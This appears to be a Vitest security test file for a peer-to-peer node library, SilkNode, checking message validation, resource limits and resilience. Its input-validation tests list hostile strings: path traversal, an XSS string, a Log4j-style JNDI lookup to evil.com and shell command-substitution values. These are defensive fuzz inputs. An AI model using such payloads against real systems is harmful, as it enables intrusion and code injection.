/**
 * 安全测试套件 - 接口契约、权限验证、攻击防护
 */

import { describe, it, expect } from 'vitest';
import { SilkNode } from '../../src/core/node.js';
import { MessageType } from '../../src/core/types.js';

describe('Security Tests', () => {
  describe('API Contract Validation', () => {
    it('should validate message version compatibility', async () => {
      const node = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/0'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      await node.start();

      try {
        // Test version validation
        const validVersions = [1];
        const invalidVersions = [0, -1, 2, 999, null, undefined];

        for (const version of validVersions) {
          const message = {
            header: {
              version,
              type: MessageType.TEXT,
              id: 'test',
              timestamp: Date.now(),
              sender: 'test'
            },
            payload: { content: 'test', encoding: 'utf-8' as const }
          };
          expect(message.header.version).toBe(version);
        }

        // Invalid versions should be handled
        for (const version of invalidVersions) {
          // Should not crash
          expect(() => {
            const message = {
              header: {
                version: version ?? 1,
                type: MessageType.TEXT,
                id: 'test',
                timestamp: Date.now(),
                sender: 'test'
              },
              payload: { content: 'test', encoding: 'utf-8' as const }
            };
            return message;
          }).not.toThrow();
        }
      } finally {
        await node.stop();
      }
    });

    it('should validate message type constraints', async () => {
      const validTypes = [
        MessageType.TEXT,
        MessageType.BINARY,
        MessageType.CONTROL,
        MessageType.ACK
      ];

      for (const type of validTypes) {
        const message = {
          header: {
            version: 1,
            type,
            id: 'test',
            timestamp: Date.now(),
            sender: 'test'
          },
          payload: { content: 'test', encoding: 'utf-8' as const }
        };
        expect(message.header.type).toBe(type);
      }
    });

    it('should validate field types', async () => {
      const node = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/0'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      await node.start();

      try {
        // ID should be string
        const stringId = 'valid-id-123';
        expect(typeof stringId).toBe('string');

        // Timestamp should be number
        const timestamp = Date.now();
        expect(typeof timestamp).toBe('number');
        expect(Number.isFinite(timestamp)).toBe(true);

        // Sender should be string
        const sender = node.peerId.toString();
        expect(typeof sender).toBe('string');
        expect(sender.length).toBeGreaterThan(0);

      } finally {
        await node.stop();
      }
    });
  });

  describe('Input Validation', () => {
    it('should sanitize peer IDs', async () => {
      const node = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/0'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      await node.start();

      try {
        const maliciousPeerIds = [
          '',                                    // Empty
          '   ',                                 // Whitespace
          '\x00',                                // Null byte
          '../etc/passwd',                       // Path traversal
          'javascript:alert(1)',                 // XSS attempt
          '${jndi:ldap://evil.com}',             // Log4j-style
          'A'.repeat(10000),                     // Very long
          '12D3KooW\x00\x00\x00',                // With null bytes
        ];

        for (const peerId of maliciousPeerIds) {
          try {
            // Attempt operations with malicious peer ID
            await node.hangUp(peerId).catch(() => {});
          } catch {
            // Expected to fail validation
          }
        }

        // Node should remain operational
        expect(node.isStarted()).toBe(true);

      } finally {
        await node.stop();
      }
    });

    it('should validate address formats', async () => {
      const node = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/0'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      await node.start();

      try {
        const invalidAddresses = [
          'not-an-address',
          'http://example.com',
          'ftp://example.com',
          '../../etc/passwd',
          '\\windows\>\system32',
          '${ENV_VAR}',
          '`whoami`',
          '$(id)',
        ];

        for (const addr of invalidAddresses) {
          try {
            await node.dial(addr);
            // Should not reach here
            expect(false).toBe(true);
          } catch {
            // Expected to fail
          }
        }

      } finally {
        await node.stop();
      }
    });
  });

  describe('Resource Exhaustion Protection', () => {
    it('should limit connection attempts', async () => {
      const node = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/13001'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      await node.start();

      try {
        // Rapid connection attempts
        const attempts = [];
        for (let i = 0; i < 100; i++) {
          attempts.push(
            node.dial(`/ip4/127.0.0.1/tcp/${14000 + i}`).catch(() => {})
          );
        }

        await Promise.all(attempts);

        // Node should still be operational
        expect(node.isStarted()).toBe(true);

      } finally {
        await node.stop();
      }
    });

    it('should handle large message payloads', async () => {
      const node1 = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/13002'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      const node2 = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/13003'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      await node1.start();
      await node2.start();

      try {
        await node1.dial(node2.getMultiaddrs()[0]);

        // Test various payload sizes
        const sizes = [100, 1000, 10000, 100000];

        for (const size of sizes) {
          const largeContent = 'x'.repeat(size);
          
          try {
            await node1.sendMessage(node2.peerId.toString(), {
              header: {
                version: 1,
                type: MessageType.TEXT,
                id: `large-${size}`,
                timestamp: Date.now(),
                sender: node1.peerId.toString()
              },
              payload: { content: largeContent, encoding: 'utf-8' }
            });
          } catch (error) {
            // Large messages may be rejected
            expect(error).toBeInstanceOf(Error);
          }
        }

        // Nodes should remain operational
        expect(node1.isStarted()).toBe(true);
        expect(node2.isStarted()).toBe(true);

      } finally {
        await node1.stop();
        await node2.stop();
      }
    });
  });

  describe('Authentication & Authorization', () => {
    it('should verify peer identity', async () => {
      const node = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/0'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      await node.start();

      try {
        // Peer ID should be valid
        const peerId = node.peerId.toString();
        expect(peerId).toBeTruthy();
        expect(peerId.length).toBeGreaterThan(10);

        // Peer ID should be consistent
        const peerId2 = node.peerId.toString();
        expect(peerId2).toBe(peerId);

      } finally {
        await node.stop();
      }
    });

    it('should reject unauthorized operations', async () => {
      const node = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/0'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      await node.start();

      try {
        // Operations on stopped node should fail
        const tempNode = new SilkNode({
          listenAddresses: ['/ip4/127.0.0.1/tcp/0'],
          transports: { tcp: true },
          discovery: { mdns: false, dht: false, bootstrap: [] },
          relay: { enabled: false }
        });

        // Should fail because node is not started
        expect(() => tempNode.peerId).toThrow();
        expect(() => tempNode.getMultiaddrs()).not.toThrow();
        expect(tempNode.getMultiaddrs()).toEqual([]);

      } finally {
        await node.stop();
      }
    });
  });

  describe('Dependency Service Simulation', () => {
    it('should handle timeout scenarios', async () => {
      const node = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/0'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      await node.start();

      try {
        // Attempt to connect to non-responsive address
        const timeoutPromise = Promise.race([
          node.dial('/ip4/192.0.2.1/tcp/4001'), // TEST-NET-1, should not respond
          new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Timeout')), 5000)
          )
        ]);

        try {
          await timeoutPromise;
        } catch (error) {
          // Expected to timeout or fail
          expect(error).toBeInstanceOf(Error);
        }

        // Node should remain operational
        expect(node.isStarted()).toBe(true);

      } finally {
        await node.stop();
      }
    });

    it('should handle service degradation', async () => {
      const node = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/0'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: true, bootstrap: [] },
        relay: { enabled: false }
      });

      await node.start();

      try {
        // DHT without bootstrap - this may throw or return various values
        // The important thing is that the node remains operational
        let dhtFailed = false;
        try {
          await node.dhtGet('test-key');
        } catch (e) {
          dhtFailed = true;
        }
        
        // Either it failed or succeeded - both are acceptable
        // The key requirement is that the node is still operational
        expect(node.isStarted()).toBe(true);

      } finally {
        await node.stop();
      }
    });
  });

  describe('Rate Limiting', () => {
    it('should handle message rate limiting', async () => {
      const node1 = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/13004'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      const node2 = new SilkNode({
        listenAddresses: ['/ip4/127.0.0.1/tcp/13005'],
        transports: { tcp: true },
        discovery: { mdns: false, dht: false, bootstrap: [] },
        relay: { enabled: false }
      });

      await node1.start();
      await node2.start();

      try {
        await node1.dial(node2.getMultiaddrs()[0]);

        // Rapid message sending
        const messages = [];
        for (let i = 0; i < 1000; i++) {
          messages.push(
            node1.sendMessage(node2.peerId.toString(), {
              header: {
                version: 1,
                type: MessageType.TEXT,
                id: `rate-${i}`,
                timestamp: Date.now(),
                sender: node1.peerId.toString()
              },
              payload: { content: 'Rate test', encoding: 'utf-8' }
            }).catch(() => {})
          );
        }

        await Promise.all(messages);

        // Nodes should remain operational
        expect(node1.isStarted()).toBe(true);
        expect(node2.isStarted()).toBe(true);

      } finally {
        await node1.stop();
        await node2.stop();
      }
    });
  });
});
